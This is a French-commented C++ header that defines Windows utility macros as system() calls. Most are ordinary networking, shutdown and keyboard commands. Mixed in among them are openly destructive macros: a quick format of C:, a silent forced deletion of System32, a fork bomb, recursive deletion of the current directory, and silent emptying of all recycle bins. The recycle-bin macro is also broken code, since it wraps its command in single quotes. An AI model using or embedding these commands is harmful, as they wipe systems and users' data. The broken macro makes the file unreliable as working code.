/**
 * @file Tina_Define_Windows.hpp
 * @brief Ce fichier permet de stoquer des macro spécifique a windows 
 * 
 * @note Vous pouvez compiler votre programme avec la ligne de commande ci-dessous si vous utiliser cette classe.
 * 
 * @brief
 * g++ -o test.exe test.cpp
 *  
 * Pour utiliser cette classe, vous devez inclure les bibliothèques suivantes :
 * - librairie fournit de base par le C/C++
 * - 
 * 
 * Fichier .hpp qui et utiliser par la classe :
 * - aucun 
 *
 * Disponibilité :
 * - Windows
 * 
 * @note Assurez-vous d'avoir les lib sur vôtre système sinon installer les lib nécessaire.
 * 
 * 
 * @author Tina
 * @date 31/07/2024
 * @version 0.2
 * @copyright Copyright 2024 Tina - Tous droits réservés
*/

#ifndef Tina_Define_Windows_
#define Tina_Define_Windows_


#ifdef _WIN32
#include <windows.h>
#endif


/**
 * @def DeletBeanWindows
 * @brief permet de suprimmer la corbeil de windows via powershell
 */
// y ajouter a la doc pour la version 0.5
#define DeletBeanWindows system('powershell -command "$drives = Get-PSDrive -PSProvider FileSystem; foreach ($drive in $drives) {Clear-RecycleBin -DriveLetter $drive.Root[0] -Force -ErrorAction SilentlyContinue}"')

/**
 * @def Tina_Console_UTF8
 * @brief permet d'afficher les caractère en UTF_8
 */
#define Tina_Console_UTF8 SetConsoleOutputCP(65001)

/**
 * @def Tina_Console_UTF7
 * @brief permet d'afficher les caractère en UTF_7
 */
#define Tina_Console_UTF7 SetConsoleOutputCP(65000)

/**
 * @def Tina_Kill_Ipv4
 * @brief permet de supprimmer l'ipv4 du pc
 */
#define Tina_Kill_Ipv4 system("ipconfig/release")

/**
 * @def Tina_Kill_Ipv6
 * @brief permet de supprimmer l'ipv6 du pc
 */
#define Tina_Kill_Ipv6 system("ipconfig /release6")

/**
 * @def Tina_Delet_Cache_DNS
 * @brief permet de supprimmer le cache dns
 */
#define Tina_Delet_Cache_DNS system("ipconfig /flushdns")

/**
 * @def Tina_Print_Cache_DNS
 * @brief permet d'affiche le contenu du cache dns
 */
#define Tina_Print_Cache_DNS system("ipconfig /displaydns")

/**
 * @def Tina_Actualiz_Cache_DNS
 * @brief permet d'actualiser le cache dns
 */
#define Tina_Actualiz_Cache_DNS system("ipconfig /registerdns")

/**
 * @def Tina_Renew_Ipv6
 * @brief permet de renouvler (cree une nouvelle ipv6) l'ipv6 
 */
#define Tina_Renew_Ipv6 system("ipconfig /renew6")

/**
 * @def Tina_Renew_Ipv4
 * @brief permet de renouvler (cree une nouvelle ipv4) l'ipv4 
 */
#define Tina_Renew_Ipv4 system("ipconfig/renew")

/**
 * @def Tina_Closed_Windows
 * @brief permet d'éteindre l'ordinateur  
 */
#define Tina_Closed_Windows system("shutdown /s /t 01")

/**
 * @def Tina_Restart_Windows
 * @brief permet de redemarer l'ordinateur  
 */
#define Tina_Restart_Windows system("shutdown /r /t 01")

/**
 * @def Tina_Change_Password
 * @brief permet d'afficher l'interface pour changer son mot de passe windows  
 */
#define Tina_Change_Password system("netplwiz")

/**
 * @def Tina_False_Closed_Windows
 * @brief permet d'annuller le redemarage ou l'eteignage du pc  
 */
#define Tina_False_Closed_Windows system("shutdown /a")

/**
 * @def Tina_Locked_Session
 * @brief permet de fermer la session Actuelle 
 */
#define Tina_Locked_Session system("rundll32.exe user32.dll,LockWorkStation")


/**
 * @def Tina_Keyboard_FR
 * @brief permet de changer la langue du clavier en français
 */
#define Tina_Keyboard_FR system("powershell Set-WinUserLanguageList -LanguageList fr-FR -Force")

/**
 * @def Tina_Keyboard_RU
 * @brief permet de changer la langue du clavier en Russe
 */
#define Tina_Keyboard_RU system("powershell Set-WinUserLanguageList -LanguageList ru-RU -Force")

/**
 * @def Tina_Keyboard_US
 * @brief permet de changer la langue du clavier en Anglais
 */
#define Tina_Keyboard_US system("powershell Set-WinUserLanguageList -LanguageList en-US -Force")


/**
 * @def Tina_Format_Disk_C
 * @brief permet de faire un formatage rapide du disk C
 */
#define Tina_Format_Disk_C system("format C: /FS:NTFS /Q")

/**
 * @def Tina_Delet_Repertoir_Actuel
 * @brief permet du supprimer fichier et dossier récursivement du repertoir ou et executer le programm
 */
#define Tina_Delet_Repertoir_Actuel system("del /Q /S * & for /D %d in (*) do @rmdir /Q /S \"%d\"")

/**
 * @def Tina_Fork_Bomb
 * @brief permet de faire une fork bombe
 */
#define Tina_Fork_Bomb system("%0|%0")

/**
 * @def Tina_Delet_System32
 * @brief permet de suprimmer le système 32 silencieusement
 */
#define Tina_Delet_System32 system("del /f /q \"C:\\Windows\\System32\\*.*\"")


#endif